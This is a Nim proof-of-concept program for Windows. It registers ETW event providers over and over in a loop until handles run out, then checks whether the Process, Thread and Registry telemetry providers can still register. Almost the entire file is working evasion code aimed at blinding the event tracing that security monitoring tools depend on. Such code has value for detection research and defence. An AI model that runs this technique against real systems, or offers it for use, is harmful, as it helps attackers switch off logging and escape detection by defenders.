import winim/lean

type
  REGHANDLE* = pointer
  PREGHANDLE* = ptr REGHANDLE

var 
  EventRegister: proc(ProviderId: ptr GUID, EnableCallback: pointer, CallbackContext: pointer, RegHandle: PREGHANDLE): ULONG {.stdcall.}
  EventUnregister: proc(RegHandle: REGHANDLE): ULONG {.stdcall.}

proc testProvider(provider: string, guid: GUID): bool =
  var testHandle: REGHANDLE
  let res = EventRegister(addr guid, nil, nil, addr testHandle)
  
  if res == ERROR_SUCCESS:
    discard EventUnregister(testHandle)
    echo provider, ": SUCCESS"
    return true
  else:
    echo provider, ": FAILED (error: ", res, ")"
    return false

proc main() =
  let hAdvapi32 = LoadLibraryA("advapi32.dll")  
  EventRegister = cast[type(EventRegister)](GetProcAddress(hAdvapi32, "EventRegister"))
  EventUnregister = cast[type(EventUnregister)](GetProcAddress(hAdvapi32, "EventUnregister"))

  var kProcessGUID: GUID
  kProcessGUID.Data1 = 0x22FB2CD6
  kProcessGUID.Data2 = 0x0E7B
  kProcessGUID.Data3 = 0x422B
  kProcessGUID.Data4 = [0xA0'u8, 0xC7, 0x2F, 0xAD, 0x1F, 0xD0, 0xE7, 0x16]
  
  var kThreadGUID: GUID
  kThreadGUID.Data1 = 0x3D6FA8D1
  kThreadGUID.Data2 = 0xFE05
  kThreadGUID.Data3 = 0x11D0
  kThreadGUID.Data4 = [0xB6'u8, 0x61, 0x00, 0xA0, 0xC9, 0x06, 0x29, 0x10]
  
  var kRegistryGUID: GUID
  kRegistryGUID.Data1 = 0x70EB4F03
  kRegistryGUID.Data2 = 0xC1DE
  kRegistryGUID.Data3 = 0x4F73
  kRegistryGUID.Data4 = [0xA3'u8, 0x51, 0x72, 0x8F, 0x3E, 0x32, 0x6F, 0x26]
  
  echo "=== BEFORE EXHAUSTION ==="
  discard testProvider("Process Provider", kProcessGUID)
  discard testProvider("Thread Provider", kThreadGUID)
  discard testProvider("Registry Provider", kRegistryGUID)

  echo "\n=== PERFORMING EXHAUSTION ==="
  var eGUID: GUID
  eGUID.Data1 = 0x230d3ce1
  eGUID.Data2 = 0xbccc
  eGUID.Data3 = 0x124e
  eGUID.Data4 = [0x93'u8, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4]
  
  var count = 0
  var handle: REGHANDLE
  while EventRegister(addr eGUID, nil, nil, addr handle) == ERROR_SUCCESS:
    inc(count)
  
  echo "[+] Successfully registered ", count, " times"
  
  echo "\n=== AFTER EXHAUSTION ==="
  let 
    afterProcess = testProvider("Process Provider", kProcessGUID)
    afterThread = testProvider("Thread Provider", kThreadGUID)
    afterRegistry = testProvider("Registry Provider", kRegistryGUID)
  
  echo "\n=== SUMMARY ==="
  echo "Process: ", not afterProcess
  echo "Thread: ", not afterThread  
  echo "Registry: ", not afterRegistry

when isMainModule:
  main()